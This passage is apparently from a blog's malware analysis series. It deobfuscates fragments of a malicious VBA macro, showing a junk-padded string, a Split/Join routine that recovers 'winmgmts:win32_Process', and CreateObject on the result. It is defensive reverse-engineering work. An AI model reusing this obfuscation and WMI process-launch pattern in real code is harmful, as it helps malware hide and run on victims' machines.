&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;haothkoebtheil = &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqw2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqm2342772g3&amp;amp;*gs7712ffvs626fqgm2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqt2342772g3&amp;amp;*gs7712ffvs626fqs2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fq:w2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqin2342772g3&amp;amp;*gs7712ffvs626fq322342772g3&amp;amp;*gs7712ffvs626fq_2342772g3&amp;amp;*gs7712ffvs626fqP2342772g3&amp;amp;*gs7712ffvs626fqr2342772g3&amp;amp;*gs7712ffvs626fqo2342772g3&amp;amp;*gs7712ffvs626fq2342772g3&amp;amp;*gs7712ffvs626fqc2342772g3&amp;amp;*gs7712ffvs626fqes2342772g3&amp;amp;*gs7712ffvs626fqs2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It still doesn't clear up the gibberish, but at least it's now one big string. This same string is then passed as a parameter to function &lt;code&gt;juuvzouchmiopxeox&lt;/code&gt;. &lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let's look at the code inside &lt;code&gt;juuvzouchmiopxeox&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Function juuvzouchmiopxeox(yiajthoavheiw)
    geutyoeytiestheug = yiajthoavheiw
    feaxgeip = Split(geutyoeytiestheug, &amp;quot;2342772g3&amp;amp;*gs7712ffvs626fq&amp;quot;)

    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
    juuvzouchmiopxeox = jaquhoiqu
End Function
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Following the code we could see that the passed string is splitted using the call to the function &lt;code&gt;Split&lt;/code&gt; with the substring &lt;code&gt;2342772g3&amp;amp;*gs7712ffvs626fq&lt;/code&gt;. This simply means that the substring is removed from the input string. The result of &lt;code&gt;Split&lt;/code&gt; is then joined into one string using &lt;code&gt;Join&lt;/code&gt;. There are the variables &lt;code&gt;csqw&lt;/code&gt; and &lt;code&gt;eihnx&lt;/code&gt;, they don't alter the string as these variables are empty. &lt;/p&gt;
&lt;p&gt;At the end of this function the value of the passed string is now:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;winmgmts&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;win32_Process&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Aha! Something that is not gibberish for a change!&lt;/p&gt;
&lt;p&gt;Going back to the caller function, the result of &lt;code&gt;juuvzouchmiopxeox&lt;/code&gt; is saved to &lt;code&gt;deulsaocthuul&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)

    Set tiajriokchaoy = CreateObject(deulsaocthuul)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After that an object is created out of &lt;code&gt;deaulsaocthuul&lt;/code&gt;, which we know contains &lt;code&gt;winmgmts:win32_Process&lt;/code&gt;. &lt;/p&gt;
&lt;p&gt;Looking at &lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process"&gt;the microsoft docs&lt;/a&gt; I find out that &lt;code&gt;The Win32_Process WMI class represents a process on an operating system.&lt;/code&gt;. Interesting.&lt;/p&gt;
&lt;h2 id="taking-a-step-back"&gt;Taking a step back&lt;/h2&gt;
&lt;p&gt;At this point there are already a number of questions that we could answer based on what we've done so far. Some are not yet answerable at the moment, however, so nothing left to do but to push forward. But that will be for the next part of this two part series.&lt;/p&gt;
&lt;p&gt;Until then, I'm taking a step back as I marvel at my progress. It wouldn't take long until all the pieces would fall into place.&lt;/p&gt;</content><category term="malware_analysis"></category><category term="re"></category><category term="malware_analysis"></category><category term="malware"></category></entry></feed>